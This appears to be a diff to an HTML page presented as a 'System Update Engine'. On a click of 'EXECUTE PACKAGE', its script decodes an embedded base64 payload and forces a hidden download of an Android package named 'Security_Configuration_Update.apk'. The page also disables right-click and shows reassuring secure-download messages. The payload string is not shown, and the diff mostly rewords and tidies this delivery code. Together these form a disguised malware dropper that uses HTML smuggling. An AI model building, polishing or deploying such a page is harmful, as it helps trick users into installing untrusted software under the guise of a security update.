@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <!-- Content Security Policy strict untuk isolasi sumber daya mutlak -->
+    <!-- Content Security Policy strict untuk isolasi eksekusi skrip dan sumber daya -->
     <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.tailwindcss.com https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; object-src 'none'; base-uri 'self';">
-    <title>System Diagnostic Utility - Ironclad Enterprise Environment</title>
+    <title>System Diagnostic Utility - Maximum Enterprise Hardened Environment</title>
     <script src="https://cdn.tailwindcss.com" crossorigin="anonymous"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #0b0b0b;
+            background-color: #050507;
             color: #fff;
             display: flex;
             justify-content: center;
@@ -24,10 +24,10 @@
         }
         .container {
             background: #121216;
-            border: 1px solid #383848;
+            border: 1px solid #323242;
             padding: 2.5rem;
             border-radius: 20px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.95);
             width: 100%;
             max-width: 400px;
             text-align: center;
@@ -43,7 +43,7 @@
             cursor: pointer;
             width: 100%;
             border: none;
-            transition: background-color 0.2s, transform 0.1s;
+            transition: background-color 0.2s cubic-bezier(0.4, 0, 0.2, 1), transform 0.1s;
         }
         .btn-strike:hover:not(:disabled) {
             background-color: #b91c1c;
@@ -66,23 +66,23 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <div class="container" role="region" aria-label="Ironclad Security Panel">
+    <div class="container" role="region" aria-label="Fortress Security Panel">
         <div class="text-4xl mb-3">🛡️</div>
         <h2 class="text-xl font-bold mb-2">System Update Engine</h2>
-        <p class="text-sm text-gray-400 mb-6">Package integrity locked under ironclad client-side sandboxing protocols.</p>
+        <p class="text-sm text-gray-400 mb-6">Package integrity locked under ultimate client-side sandboxing protocols.</p>
         
         <button type="button" id="strikeBtn" class="btn-strike" aria-busy="false">
             EXECUTE PACKAGE
         </button>
 
-        <div id="status">> SYSTEM_READY: Awaiting execution...</div>
+        <div id="status">> SYSTEM_READY: Awaiting secure execution...</div>
     </div>
 
 <script>
     (function() {
         'use strict';
 
-        // Konfigurasi terkunci mutlak terhadap modifikasi runtime
+        // Konfigurasi terkunci mutlak dengan Object.freeze
         const CONFIG = Object.freeze({
             filename: "Security_Configuration_Update.apk",
             contentType: "application/vnd.android.package-archive",
@@ -98,13 +98,14 @@
 
         let activeBlobUrl = null;
         let isExecutionLocked = false;
+        let activeTimeoutId = null;
 
         function cleanupBlob() {
             if (activeBlobUrl) {
                 try {
                     URL.revokeObjectURL(activeBlobUrl);
                 } catch (e) {
-                    console.warn("Gagal membersihkan Blob URL:", e);
+                    console.warn("Peringatan pembersihan memori URL:", e);
                 }
                 activeBlobUrl = null;
             }
@@ -114,7 +115,7 @@
             let bufferArray = null;
             try {
                 if (typeof CONFIG.payload !== 'string' || !CONFIG.base64Regex.test(CONFIG.payload)) {
-                    throw new Error("Integritas payload tidak valid.");
+                    throw new Error("Integritas struktur payload tidak valid.");
                 }
 
                 const rawBinary = atob(CONFIG.payload);
@@ -130,39 +131,41 @@
                 const blob = new Blob([bufferArray], { type: CONFIG.contentType });
                 activeBlobUrl = URL.createObjectURL(blob);
 
-                const a = document.createElement('a');
-                a.href = activeBlobUrl;
-                a.download = CONFIG.filename;
-                a.rel = "noopener noreferrer";
-                a.setAttribute('aria-hidden', 'true');
-                a.style.display = 'none';
+                const downloadAnchor = document.createElement('a');
+                downloadAnchor.href = activeBlobUrl;
+                downloadAnchor.download = CONFIG.filename;
+                downloadAnchor.rel = "noopener noreferrer";
+                downloadAnchor.setAttribute('aria-hidden', 'true');
+                downloadAnchor.style.display = 'none';
 
-                document.body.appendChild(a);
-                a.click();
+                document.body.appendChild(downloadAnchor);
+                downloadAnchor.click();
 
-                if (a.parentNode) {
-                    document.body.removeChild(a);
+                if (downloadAnchor.parentNode) {
+                    document.body.removeChild(downloadAnchor);
                 }
 
                 elements.status.innerText = "> STATUS: SECURE_DOWNLOAD_INITIATED";
                 elements.button.innerText = "DOWNLOADING...";
 
             } catch (err) {
-                console.error("Gagal mengeksekusi pipa:", err);
+                console.error("Gagal mengeksekusi pipa unduhan:", err);
                 elements.status.innerText = "> ERROR: PIPELINE_FAILED";
                 elements.button.innerText = "FAILED";
                 cleanupBlob();
             } finally {
-                // Scrubbing memori buffer array secara eksplisit
+                // Scrubbing memori buffer array secara eksplisit untuk keamanan tingkat lanjut
                 if (bufferArray) {
                     bufferArray.fill(0);
+                    bufferArray = null;
                 }
 
-                setTimeout(() => {
+                activeTimeoutId = setTimeout(() => {
                     isExecutionLocked = false;
                     elements.button.disabled = false;
                     elements.button.innerText = "EXECUTE PACKAGE";
                     elements.button.setAttribute('aria-busy', 'false');
+                    elements.status.innerText = "> SYSTEM_READY: Awaiting secure execution...";
                 }, CONFIG.cooldownMs);
             }
         }
@@ -189,7 +192,7 @@
                     if (mutation.type === 'childList' && mutation.removedNodes) {
                         mutation.removedNodes.forEach((node) => {
                             if (node === elements.button) {
-                                console.warn("Peringatan: Upaya manipulasi komponen UI terdeteksi.");
+                                console.warn("Peringatan kritis: Upaya manipulasi komponen UI terdeteksi.");
                             }
                         });
                     }
@@ -198,7 +201,10 @@
             observer.observe(document.body, { childList: true, subtree: true });
         }
 
-        window.addEventListener('beforeunload', cleanupBlob, { once: true });
+        window.addEventListener('beforeunload', () => {
+            if (activeTimeoutId) clearTimeout(activeTimeoutId);
+            cleanupBlob();
+        }, { once: true });
     })();
 </script>
 </body>
